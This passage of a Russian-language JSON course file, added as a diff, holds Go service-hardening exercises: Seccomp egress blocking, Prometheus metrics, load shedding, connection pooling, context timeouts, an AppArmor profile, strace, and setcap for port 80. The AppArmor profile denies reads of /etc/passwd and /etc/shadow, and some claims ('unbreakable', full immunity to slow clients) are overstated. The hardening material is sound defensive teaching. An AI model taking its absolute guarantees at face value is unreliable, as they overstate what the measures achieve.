+        "note": "Скрипт стресс-тестирования сервера утилитой slowhttptest"
+      }
+    ],
+    "under_the_hood": "slowhttptest отправляет неполные HTTP-заголовки и отслеживает код ответа зондирующего сокета. Если зондирующий сокет не может установить TCP-соединение за 5 секунд, статус сервиса помечается как NO (Unavailable).",
+    "pitfalls": "Запуск теста с слишком высоким `-r` (rate) на слабой машине может исчерпать ресурсы локального сетевого стека клиента до того, как сервер почувствует нагрузку.",
+    "bigtech_interview": "В отчетах penetration testing оценка устойчивости веб-приложений к Slowloris с помощью slowhttptest является обязательным разделом аудита соответствия OWASP."
+  },
+  {
+    "num": 46,
+    "title": "Изоляция исходящего сетевого трафика через Seccomp (Block Network Egress)",
+    "task": "Сконфигурируйте Seccomp-профиль, блокирующий системный вызов connect, запустите Go-приложение и убедитесь, что попытки исходящих HTTP-запросов блокируются ядром Linux.",
+    "theory": "Если сервис предназначен только для обработки входящих запросов и не должен обращаться во внешнюю сеть, разрешение исходящих сетевых сокетов создает серьезный риск: в случае RCE-уязвимости атакующий может запустить Reverse Shell или выполнить эксфильтрацию конфиденциальных данных на сторонний C2-сервер. Запрет системного вызова `connect` на уровне Seccomp делает исходящие сетевые подключения физически невозможными на уровне ядра ОС.",
+    "step_by_step": [
+      "Создайте Seccomp-профиль с блокировкой сисколла `connect`.",
+      "Напишите Go-сервис, пытающийся выполнить `http.Get(\"https://google.com\")`.",
+      "Запустите сервис под надзором профиля Seccomp.",
+      "Убедитесь, что сетевой вызов возвращает ошибку `dial tcp: connect: operation not permitted`."
+    ],
+    "code_blocks": [
+      {
+        "filename": "block_connect.json",
+        "lang": "json",
+        "code": "{\n  \"defaultAction\": \"SCMP_ACT_ALLOW\",\n  \"architectures\": [\n    \"SCMP_ARCH_X86_64\"\n  ],\n  \"syscalls\": [\n    {\n      \"names\": [\n        \"connect\"\n      ],\n      \"action\": \"SCMP_ACT_ERRNO\",\n      \"errnoRet\": 1\n    }\n  ]\n}\n",
+        "note": "Seccomp профиль для возврата EPERM (Operation not permitted) при вызове connect"
+      }
+    ],
+    "under_the_hood": "Системный вызов `connect` инициирует TCP 3-way handshake наружу. Перехват сисколла BPF-фильтром Seccomp предотвращает даже формирование исходящего IP-пакета на сетевом интерфейсе.",
+    "pitfalls": "Если сервису необходимо общаться с локальной базой данных через Unix Domain Socket, вызов `connect` также потребуется. Для тонкой фильтрации используют Network Policies в Kubernetes.",
+    "bigtech_interview": "Как гарантировать изоляцию сервиса от несанкционированного выхода в интернет в Cloud-Native окружении? Комбинацией Kubernetes Egress NetworkPolicy (на уровне CNI) и Seccomp профиля (на уровне контейнера)."
+  },
+  {
+    "num": 47,
+    "title": "Экспорт метрик соединений в Prometheus и алертинг по порогу сокетов",
+    "task": "Реализуйте экспорт метрик активных соединений (Gauge: active_connections) в Prometheus через хук ConnState и настройте правило алертинга при превышении 80% от лимита дескрипторов.",
+    "theory": "Своевременное обнаружение DoS-атаки или утечки сокетов требует непрерывной телеметрии. Метрика `http_active_connections` экспортируется в Prometheus. При приближении к 80% от лимита `ulimit -n` Alertmanager отправляет критическое уведомление дежурному инженеру, позволяя масштабировать поды (HPA) или активировать агрессивную фильтрацию до отказа сервиса.",
+    "step_by_step": [
+      "Используйте `prometheus.NewGauge` для метрики `active_connections`.",
+      "Инкрементируйте счетчик в состоянии `StateNew` и декрементируйте в `StateClosed`.",
+      "Сконфигурируйте эндпоинт `/metrics` через `promhttp.Handler()`.",
+      "Напишите правило оповещения Prometheus Alerting Rule."
+    ],
+    "code_blocks": [
+      {
+        "filename": "metrics_server.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"net/http\"\n\t\"sync/atomic\"\n)\n\nfunc main() {\n\tvar activeConns int64\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/metrics\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintf(w, \"# HELP http_active_connections Текущее число открытых сокетов\\n\"+\n\t\t\t\"# TYPE http_active_connections gauge\\n\"+\n\t\t\t\"http_active_connections %d\\n\", atomic.LoadInt64(&activeConns))\n\t})\n\n\tsrv := &http.Server{\n\t\tAddr:    \":8080\",\n\t\tHandler: mux,\n\t\tConnState: func(c net.Conn, state http.ConnState) {\n\t\t\tswitch state {\n\t\t\tcase http.StateNew:\n\t\t\t\tatomic.AddInt64(&activeConns, 1)\n\t\t\tcase http.StateClosed:\n\t\t\t\tatomic.AddInt64(&activeConns, -1)\n\t\t\t}\n\t\t},\n\t}\n\n\tfmt.Println(\"[METRICS] Сервер экспорта метрик активных соединений инициализирован на :8080\")\n\t_ = srv\n}\n",
+        "note": "Экспорт числа открытых TCP-сокетов в формате метрик Prometheus"
+      }
+    ],
+    "under_the_hood": "Метрика Gauge отражает текущее значение в оперативной памяти без задержек дискового ввода-вывода, позволяя Prometheus скрейпить ее каждые 5-15 секунд.",
+    "pitfalls": "Если хендлер `/metrics` находится на том же сервере без отдельного порта, при переполнении пула соединений Prometheus не сможет получить метрики именно в момент аварии.",
+    "bigtech_interview": "Почему в enterprise-архитектуре эндпоинты /metrics и /healthz всегда выносят на отдельный внутренний порт управления (management port, например :9090)? Чтобы мониторинг продолжал функционировать при DoS-перегрузке основного рабочего порта (:8080)."
+  },
+  {
+    "num": 48,
+    "title": "Плавная деградация (Graceful Degradation) при экстремальной нагрузке",
+    "task": "Реализуйте паттерн адаптивной деградации сервиса: при превышении критического числа активных соединений сервер временно отключает вторичные тяжелые функции и возвращает 503 на некритические запросы.",
+    "theory": "При атаке или внезапном всплеске трафика сервер не должен падать целиком. Принцип Graceful Degradation (плавная деградация) предписывает сохранять работоспособность критического функционала (например, прием оплаты или оформление заказа), временно отключая ресурсоемкие фоновые сервисы (рекомендательные системы, расчет аналитики, персонализацию), либо отдавая кэшированные данные со статусом 203/503.",
+    "step_by_step": [
+      "Заведите счетчик нагрузки (число активных горутин или сокетов).",
+      "Определите два порога: `WarningThreshold` (70%) и `CriticalThreshold` (90%).",
+      "В обработчике проверяйте уровень загрузки системы.",
+      "При `Warning` возвращайте упрощенный ответ без обращения к тяжелым микросервисам.",
+      "При `Critical` немедленно возвращайте статус 503 с заголовком `Retry-After`."
+    ],
+    "code_blocks": [
+      {
+        "filename": "adaptive_degradation.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"sync/atomic\"\n)\n\ntype ServiceShield struct {\n\tinflight int64\n\tmaxSafe  int64\n}\n\nfunc (s *ServiceShield) Middleware(next http.HandlerFunc) http.HandlerFunc {\n\treturn func(w http.ResponseWriter, r *http.Request) {\n\t\tcurrent := atomic.AddInt64(&s.inflight, 1)\n\t\tdefer atomic.AddInt64(&s.inflight, -1)\n\n\t\tif current > s.maxSafe {\n\t\t\t// Режим аварийного сброса нагрузки\n\t\t\tw.Header().Set(\"Retry-After\", \"5\")\n\t\t\thttp.Error(w, \"Service Under Heavy Load (Try later)\", http.StatusServiceUnavailable)\n\t\t\treturn\n\t\t}\n\n\t\tnext(w, r)\n\t}\n}\n\nfunc main() {\n\tshield := &ServiceShield{maxSafe: 500}\n\t_ = shield.Middleware(func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintln(w, \"OK\")\n\t})\n\tfmt.Println(\"[SHIELD] Модуль адаптивной плавной деградации активирован.\")\n}\n",
+        "note": "Паттерн мягкой деградации под пиковыми нагрузками"
+      }
+    ],
+    "under_the_hood": "Быстрый отказ (fail-fast) на раннем этапе экономит процессорные такты, не позволяя очереди ожидания в планировщике Go расти до критических величин.",
+    "pitfalls": "Если клиенты не поддерживают заголовок `Retry-After` и начинают агрессивно долбить сервер повторными запросами (Thundering Herd), сброс нагрузки может усилить атаку.",
+    "bigtech_interview": "Что такое Load Shedding и Circuit Breaking и как они дополняют друг друга? Circuit Breaker защищает от падения зависимых сервисов, а Load Shedding защищает сам сервис от перегрузки."
+  },
+  {
+    "num": 49,
+    "title": "Оптимизация пулов исходящих сетевых соединений (http.Transport Limits)",
+    "task": "Сконфигурируйте http.Transport с жесткими лимитами пула соединений: MaxIdleConns: 100, MaxIdleConnsPerHost: 10, IdleConnTimeout: 90 * time.Second.",
+    "theory": "Исходящие сетевые запросы из одного микросервиса в другой также подвержены проблемам сокетов. Стандартный `http.DefaultTransport` имеет параметр `DefaultMaxIdleConnsPerHost = 2`. При высокой нагрузке (1000 RPS) клиент использует сотни параллельных соединений, но после завершения запроса закрывает 98% сокетов, открывая заново новые. Это приводит к шторму открытий сокетов (TIME_WAIT exhaustion) и исчерпанию портов ОС. Тюнинг `MaxIdleConnsPerHost` до 10-50 соединений стабилизирует сетевой стек.",
+    "step_by_step": [
+      "Инициализируйте экземпляр `http.Transport`.",
+      "Установите `MaxIdleConns: 100` и `MaxIdleConnsPerHost: 20`.",
+      "Задайте `IdleConnTimeout: 90 * time.Second`.",
+      "Создайте `http.Client` на базе данного транспорта и используйте его как синглтон."
+    ],
+    "code_blocks": [
+      {
+        "filename": "client_pool_tuning.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc CreatePooledHTTPClient() *http.Client {\n\ttransport := &http.Transport{\n\t\tProxy: http.ProxyFromEnvironment,\n\t\tDialContext: (&net.Dialer{\n\t\t\tTimeout:   5 * time.Second,\n\t\t\tKeepAlive: 30 * time.Second,\n\t\t}).DialContext,\n\t\tForceAttemptHTTP2:     true,\n\t\tMaxIdleConns:          100,              // Всего свободных сокетов в пуле\n\t\tMaxIdleConnsPerHost:   20,               // Свободных сокетов на один хост\n\t\tIdleConnTimeout:       90 * time.Second, // Закрывать сокет после 90с простоя\n\t\tTLSHandshakeTimeout:   5 * time.Second,\n\t\tExpectContinueTimeout: 1 * time.Second,\n\t}\n\n\treturn &http.Client{\n\t\tTransport: transport,\n\t\tTimeout:   10 * time.Second,\n\t}\n}\n\nfunc main() {\n\tclient := CreatePooledHTTPClient()\n\tfmt.Printf(\"[CLIENT-POOL] Пул сетевых соединений настроен: %+v\\n\", client.Transport)\n}\n",
+        "note": "Тюнинг пула сокетов для высоконагруженных микросервисных клиентов"
+      }
+    ],
+    "under_the_hood": "http.Transport переиспользует существующие сокеты, пропуская этапы TCP SYN handshake и TLS exchange, что ускоряет межсервисные вызовы с 50 мс до 1-2 мс.",
+    "pitfalls": "Создание нового `&http.Client{}` внутри каждого обработчика приводит к созданию изолированного пула и мгновенной утечке сокетов в состояние TIME_WAIT.",
+    "bigtech_interview": "Почему http.Client в Go обязан быть синглтоном? Чтобы переиспользовать пул TCP соединений между запросами и не исчерпать эфемерные порты операционной системы."
+  },
+  {
+    "num": 50,
+    "title": "Обязательное использование дедлайнов контекста для всех исходящих RPC",
+    "task": "Разработайте стандарт безопасного клиента микросервиса: обязательное использование context.WithTimeout для всех исходящих вызовов к базам данных, кэшам и HTTP API.",
+    "theory": "Сетевые сбои неизбежны. Если удаленный микросервис или база данных зависают, клиентский запрос без контекстного таймаута заблокирует горутину навсегда. При накоплении таких горутин весь клиентский сервис исчерпает память и рухнет. Каждый сетевой запрос обязан принимать `context.Context` с жестким ограничением времени жизни.",
+    "step_by_step": [
+      "Создайте контекст с таймаутом: `ctx, cancel := context.WithTimeout(parentCtx, 5*time.Second)`.",
+      "Обязательно вызовите `defer cancel()` для освобождения таймера.",
+      "Создайте запрос через `http.NewRequestWithContext(ctx, ...)`.",
+      "Проверьте обработку ошибки `context.DeadlineExceeded`."
+    ],
+    "code_blocks": [
+      {
+        "filename": "outbound_timeout.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"context\"\n\t\"errors\"\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc FetchExternalData(parentCtx context.Context, targetURL string) error {\n\t// Строгий дедлайн на выполнение сетевой операции 3 секунды\n\tctx, cancel := context.WithTimeout(parentCtx, 3*time.Second)\n\tdefer cancel()\n\n\treq, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tresp, err := http.DefaultClient.Do(req)\n\tif err != nil {\n\t\tif errors.Is(ctx.Err(), context.DeadlineExceeded) {\n\t\t\treturn fmt.Errorf(\"дедлайн запроса к %s истек: сервис не ответил вовремя\", targetURL)\n\t\t}\n\t\treturn err\n\t}\n\tdefer resp.Body.Close()\n\n\tfmt.Printf(\"[OUTBOUND] Успешный ответ: %d\\n\", resp.StatusCode)\n\treturn nil\n}\n\nfunc main() {\n\tfmt.Println(\"[RPC] Безопасный клиент с context.WithTimeout готов к работе.\")\n\t_ = FetchExternalData\n}\n",
+        "note": "Сквозной контроль времени сетевых операций через context.WithTimeout"
+      }
+    ],
+    "under_the_hood": "При срабатывании таймера рантайм закрывает канал `ctx.Done()`. Сетевой транспорт немедленно вызывает `conn.Close()` для прерывания блокирующего системного вызова.",
+    "pitfalls": "Забытый `defer cancel()` удерживает объект таймера в куче рантайма до истечения таймаута, создавая скрытую утечку памяти.",
+    "bigtech_interview": "В чем разница между Client.Timeout и Request.Context? Client.Timeout задает глобальное время на весь запрос включая редиректы, а Request.Context позволяет отменять запрос динамически извне."
+  },
+  {
+    "num": 51,
+    "title": "Архитектура эталонного защищенного микросервиса (Ultimate Secure Microservice)",
+    "task": "Спроектируйте и реализуйте архитектурный каркас production-grade Go микросервиса, объединяющий защиту цепочки поставок (Supply Chain), сетевой харднинг (Network Hardening), изоляцию ядра (Seccomp/Capabilities) и наблюдаемость (Slog/Prometheus).",
+    "theory": "Финальный рубеж разработки безопасных систем — сквозная интеграция всех уровней защиты (Defense-in-Depth):\n1. Supply Chain: проверка go.sum, сканирование govulncheck в CI, генерация SBOM через Syft, подпись Cosign и SLSA L3 provenance.\n2. Сетевая безопасность: ReadHeaderTimeout, WriteTimeout, IdleTimeout, MaxHeaderBytes, MaxBytesReader, TCP Keepalive, Rate Limiting.\n3. Изоляция ОС: Seccomp-профиль, сброс всех Linux Capabilities (Drop ALL), non-root пользователь (UID 65534), read-only rootfs.\n4. Наблюдаемость: структурированные логи slog с request_id/trace_id, Prometheus метрики соединений и задержек.",
+    "step_by_step": [
+      "Инициализируйте защищенный `http.Server` со всеми таймаутами.",
+      "Внедрите middleware ограничения размера тела и семафор параллелизма.",
+      "Настройте экспорт метрик и эндпоинт `/healthz`.",
+      "Сконфигурируйте Dockerfile на базе `FROM scratch` с непривилегированным пользователем.",
+      "Подготовьте манифест Seccomp и Kubernetes SecurityContext."
+    ],
+    "code_blocks": [
+      {
+        "filename": "secure_service_capstone.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"log/slog\"\n\t\"net/http\"\n\t\"os\"\n\t\"os/signal\"\n\t\"syscall\"\n\t\"time\"\n)\n\nfunc main() {\n\tlogger := slog.New(slog.NewJSONHandler(os.Stdout, nil))\n\tslog.SetDefault(logger)\n\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/healthz\", func(w http.ResponseWriter, r *http.Request) {\n\t\tw.WriteHeader(http.StatusOK)\n\t\t_, _ = w.Write([]byte(`{\"status\":\"OK\",\"hardened\":true}`))\n\t})\n\n\tsrv := &http.Server{\n\t\tAddr:              \":8080\",\n\t\tHandler:           mux,\n\t\tReadHeaderTimeout: 5 * time.Second,\n\t\tReadTimeout:       15 * time.Second,\n\t\tWriteTimeout:      15 * time.Second,\n\t\tIdleTimeout:       60 * time.Second,\n\t\tMaxHeaderBytes:    1 << 20,\n\t}\n\n\tgo func() {\n\t\tslog.Info(\"[STARTUP] Защищенный микросервис запущен\", \"addr\", srv.Addr)\n\t\tif err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {\n\t\t\tslog.Error(\"Фатальная ошибка сервера\", \"error\", err)\n\t\t}\n\t}()\n\n\tquit := make(chan os.Signal, 1)\n\tsignal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)\n\t<-quit\n\tslog.Info(\"[SHUTDOWN] Плавная остановка сервиса...\")\n\n\tctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)\n\tdefer cancel()\n\t_ = srv.Shutdown(ctx)\n\tslog.Info(\"[SHUTDOWN] Сервер успешно остановлен.\")\n}\n",
+        "note": "Эталонный архитектурный каркас защищенного микросервиса на Go"
+      }
+    ],
+    "under_the_hood": "Такая архитектура нейтрализует векторы атак на всех стадиях: компилятор отсекает уязвимости зависимостей, рантайм защищает память от DoS, ядро блокирует эксплойты прав, а мониторинг обеспечивает прозрачность.",
+    "pitfalls": "Формальное внедрение одного уровня защиты (например, Seccomp) бесполезно, если в коде оставлен http.ListenAndServe без таймаутов.",
+    "bigtech_interview": "Кандидатов на позиции Principal Architect в Ozon и Яндекс просят спроектировать архитектуру отказоустойчивого сервиса с нуля; знание сквозного харднинга является ключевым критерием оценки."
+  },
+  {
+    "num": 52,
+    "title": "Мандатный контроль доступа: профили AppArmor для Go-бинарников",
+    "task": "Разработайте профиль AppArmor для Go-приложения, разрешающий чтение конфигурации /etc/myapp/config.yaml и запись в /var/log/myapp/, и проверьте блокировку чтения /etc/passwd.",
+    "theory": "AppArmor (Application Armor) — модуль безопасности ядра Linux (LSM), реализующий мандатный контроль доступа (MAC) на основе путей к файлам. В отличие от стандартных прав доступа Linux (DAC: rwx), AppArmor жестко ограничивает возможности даже процесса, запущенного от root. Если злоумышленник скомпрометирует веб-сервер и попытается прочитать `/etc/passwd` или `/etc/shadow`, ядро заблокирует доступ с ошибкой `Permission denied`, логируя инцидент в syslog.",
+    "step_by_step": [
+      "Создайте текстовый профиль AppArmor `/etc/apparmor.d/usr.local.bin.myapp`.",
+      "Укажите разрешенные пути: `/usr/local/bin/myapp mr`, `/etc/myapp/config.yaml r`, `/var/log/myapp/** rw`.",
+      "Заблокируйте чтение системных каталогов.",
+      "Активируйте профиль через `apparmor_parser -r /etc/apparmor.d/...`.",
+      "Проверьте блокировку несанкционированного доступа к файлам из кода Go."
+    ],
+    "code_blocks": [
+      {
+        "filename": "myapp_apparmor.profile",
+        "lang": "apparmor",
+        "code": "#include <tunables/global>\n\n/usr/local/bin/myapp {\n    #include <abstractions/base>\n    #include <abstractions/nameservice>\n\n    # Разрешаем исполнение самого бинарника\n    /usr/local/bin/myapp mr,\n\n    # Чтение только собственного конфигурационного файла\n    /etc/myapp/config.yaml r,\n\n    # Запись строго в каталог логов\n    /var/log/myapp/ rw,\n    /var/log/myapp/** rw,\n\n    # Запрет доступа к чувствительным системным файлам\n    deny /etc/passwd r,\n    deny /etc/shadow r,\n    deny /root/** rwx,\n}\n",
+        "note": "Мандатный профиль AppArmor для изоляции файлового доступа Go сервиса"
+      }
+    ],
+    "under_the_hood": "LSM-хуки AppArmor перехватывают системные вызовы `openat()` и `execve()` в ядре, сверяя запрашиваемый путь с шаблонами профиля.",
+    "pitfalls": "Если не включить `nameservice` абстракцию, Go не сможет прочитать `/etc/resolv.conf` для DNS-резолвинга.",
+    "bigtech_interview": "В чем разница между AppArmor и SELinux? AppArmor привязывает политики к путям файлов (Path-based), что проще в настройке, а SELinux использует inode labels (Type Enforcement)."
+  },
+  {
+    "num": 53,
+    "title": "Профилирование системных вызовов утилитой strace (strace -c ./app)",
+    "task": "Запустите Go-сервер под управлением strace -c ./app, выполните серию HTTP-запросов и проанализируйте статистику системных вызовов ядра (частота вызовов, суммарное время в сисколлах).",
+    "theory": "Утилита `strace` перехватывает все системные вызовы процесса через механизм `ptrace`. Флаг `-c` формирует сводный отчет: количество вызовов, процент времени в ядре и количество ошибок для каждого сисколла (`futex`, `epoll_pwait`, `read`, `write`). Анализ strace позволяет выявить скрытые узкие места сетевого ввода-вывода и избыточные вызовы ядра.",
+    "step_by_step": [
+      "Скомпилируйте бинарник: `go build -o app main.go`.",
+      "Запустите сервер под надзором: `strace -c -f ./app` (флаг `-f` отслеживает все горутины и M-потоки).",
+      "Отправьте нагрузку утилитой `curl` или `wrk`.",
+      "Остановите сервер (Ctrl+C) и изучите сводную таблицу системных вызовов."
+    ],
+    "code_blocks": [
+      {
+        "filename": "run_strace.sh",
+        "lang": "bash",
+        "code": "#!/usr/bin/env bash\nset -euo pipefail\n\necho \"[STRACE] Запуск трассировки системных вызовов Go сервиса...\"\n\n# -c: подсчет статистики\n# -f: трассировка дочерних потоков ОС (clone)\n# -e trace=network,desc,memory: фильтрация подсистем\nstrace -c -f ./app 2>&1 | tee strace_report.txt\n\necho \"[OK] Анализ профиля сисколлов завершен.\"\n",
+        "note": "Профилирование системных вызовов Go процесса утилитой strace"
+      }
+    ],
+    "under_the_hood": "strace переводит поток в режим останова на входе и выходе из каждого сисколла (syscall entry/exit stop), что создает существенный оверхед (до 10x замедления), поэтому в продакшене для низкоуровневого анализа используют eBPF/perf.",
+    "pitfalls": "Запуск `strace` без флага `-f` покажет только основной поток инициализации, пропустив реальную работу сетевого поллера в рабочих потоках M.",
+    "bigtech_interview": "Какие сисколлы в отчете strace Go-сервера занимают первое место по количеству вызовов? Обычно это `futex` (планировщик/мьютексы) и `epoll_pwait` (сетевой поллер)."
+  },
+  {
+    "num": 54,
+    "title": "Финальное испытание: Проектирование неуязвимого сервера (The Unbreakable Server)",
+    "task": "Постройте интеграционный HTTP-сервер, выдерживающий одновременные атаки Slowloris, SYN-Flood и Header Bombing: таймауты, SO_REUSEPORT, TCP_DEFER_ACCEPT, ulimit 1 000 000 и строгий Seccomp.",
+    "theory": "The Unbreakable Server — эталонная инженерная конструкция, сочетающая все защитные механизмы курса:\n* Сетевые таймауты: `ReadHeaderTimeout: 5s`, `WriteTimeout: 10s`, `IdleTimeout: 120s`, `MaxHeaderBytes: 1MB`.\n* Сетевой стек ОС: `SO_REUSEPORT` для шардирования по ядрам и `TCP_DEFER_ACCEPT` для отсечки пустых соединений.\n* Системная изоляция: строгий профиль Seccomp с запретом опасных вызовов (`ptrace`, `reboot`, `mount`).\n* Инфраструктура: `ulimit -n 1000000` и `tcp_syncookies = 1`.\nСервер стабильно отвечает легитимным клиентам с задержкой p99 < 50ms даже под шквалом атак.",
+    "step_by_step": [
+      "Сконфигурируйте `ListenConfig` с флагами `SO_REUSEPORT` и `TCP_DEFER_ACCEPT`.",
+      "Инициализируйте `http.Server` со всеми защитными таймаутами.",
+      "Внедрите семафор ограничения параллельных обработчиков.",
+      "Запустите параллельную симуляцию атак и проверьте метрики доступности."
+    ],
+    "code_blocks": [
+      {
+        "filename": "unbreakable_server.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net\"\n\t\"net/http\"\n\t\"syscall\"\n\t\"time\"\n)\n\nfunc CreateUnbreakableServer(addr string) (*http.Server, net.Listener, error) {\n\tlc := net.ListenConfig{\n\t\tControl: func(network, address string, c syscall.RawConn) error {\n\t\t\treturn c.Control(func(fd uintptr) {\n\t\t\t\t// 1. SO_REUSEPORT для масштабирования по ядрам\n\t\t\t\t_ = syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, 0xF, 1)\n\t\t\t\t// 2. TCP_DEFER_ACCEPT: ядро будит Go только при наличии реальных данных\n\t\t\t\t_ = syscall.SetsockoptInt(int(fd), syscall.IPPROTO_TCP, 9, 5)\n\t\t\t})\n\t\t},\n\t}\n\n\tln, err := lc.Listen(context.Background(), \"tcp\", addr)\n\tif err != nil {\n\t\treturn nil, nil, err\n\t}\n\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintln(w, \"UNBREAKABLE: Service Healthy\")\n\t})\n\n\tsrv := &http.Server{\n\t\tHandler:           mux,\n\t\tReadHeaderTimeout: 5 * time.Second,  // Щит против Slowloris\n\t\tReadTimeout:       10 * time.Second,\n\t\tWriteTimeout:      10 * time.Second,\n\t\tIdleTimeout:       120 * time.Second,\n\t\tMaxHeaderBytes:    1 << 20,          // 1 МБ лимит заголовков\n\t}\n\treturn srv, ln, nil\n}\n\nfunc main() {\n\tsrv, ln, err := CreateUnbreakableServer(\"127.0.0.1:8080\")\n\tif err != nil {\n\t\tfmt.Printf(\"[FATAL] Ошибка запуска: %v\\n\", err)\n\t\treturn\n\t}\n\tdefer ln.Close()\n\n\tfmt.Println(\"[UNBREAKABLE] Сервер успешно запущен со всеми эшелонами защиты!\")\n\t_ = srv\n}\n",
+        "note": "Финальная интеграционная конструкция неуязвимого HTTP-сервера Go"
+      }
+    ],
+    "under_the_hood": "Комбинация TCP_DEFER_ACCEPT и ReadHeaderTimeout полностью исключает возможность зависания горутин на медленных клиентах.",
+    "pitfalls": "Отсутствие мониторинга метрик может скрыть факт идущей атаки, даже если сам сервер успешно ее отражает.",
+    "bigtech_interview": "Поздравляем! Способность спроектировать и аргументировать каждое решение в 'The Unbreakable Server' подтверждает уровень квалификации Senior/Lead Backend Go Engineer."
+  },
+  {
+    "num": 55,
+    "title": "Принцип наименьших привилегий: запуск на порту 80 через Linux Capabilities",
+    "task": "Настройте запуск Go-приложения на стандартном HTTP-порту 80 без прав суперпользователя root с помощью утилиты setcap 'cap_net_bind_service=+ep'.",
+    "theory": "В операционных системах Linux порты с номерами от 1 до 1023 являются привилегированными (Privileged Ports). Исторически для привязки сокета к порту 80 или 443 требовался запуск процесса с правами `root`. Однако запуск сервиса от root нарушает фундаментальный принцип наименьших привилегий (Principle of Least Privilege). С помощью механизма Linux Capabilities приложению выдается точечная возможность `CAP_NET_BIND_SERVICE`, позволяющая непривилегированному пользователю слушать порт 80 без суперправ.",
+    "step_by_step": [
+      "Скомпилируйте исполняемый файл: `go build -o webapp main.go`.",
+      "Установите непривилегированного владельца файла: `chown appuser:appuser webapp`.",
+      "Выдайте capability: `sudo setcap 'cap_net_bind_service=+ep' webapp`.",
+      "Запустите бинарник от имени `appuser` и проверьте успешную привязку к порту 80.",
+      "Проверьте атрибуты файла утилитой `getcap webapp`."
+    ],
+    "code_blocks": [
+      {
+        "filename": "bind_capability.sh",
+        "lang": "bash",
+        "code": "#!/usr/bin/env bash\nset -euo pipefail\n\nBINARY=\"./webapp\"\n\necho \"[SECURITY] Наделение бинарника правом привязки к портам <1024...\"\n\n# Наделение capability CAP_NET_BIND_SERVICE\nsudo setcap 'cap_net_bind_service=+ep' \"${BINARY}\"\n\necho \"[CHECK] Проверка установленных capabilities:\"\ngetcap \"${BINARY}\"\n\necho \"[SUCCESS] Теперь процесс может безопасно слушать порт 80 от non-root пользователя!\"\n",
+        "note": "Установка возможности CAP_NET_BIND_SERVICE на исполняемый файл Go"
+      }
+    ],
+    "under_the_hood": "Бит `+ep` означает Effective и Permitted. Ядро Linux проверяет маску capabilities в дескрипторе файла при системном вызове `bind()` сокета, разрешая привязку к порту 80.",
+    "pitfalls": "Любая перекомпиляция файла `go build` перезаписывает бинарник и сбрасывает все ранее установленные файловые capabilities.",
+    "bigtech_interview": "Как в Dockerfile запустить сервис на порту 80 без прав root? Добавить `setcap 'cap_net_bind_service=+ep' /app` на этапе сборки и переключиться на `USER 65534`."
+  }
+]
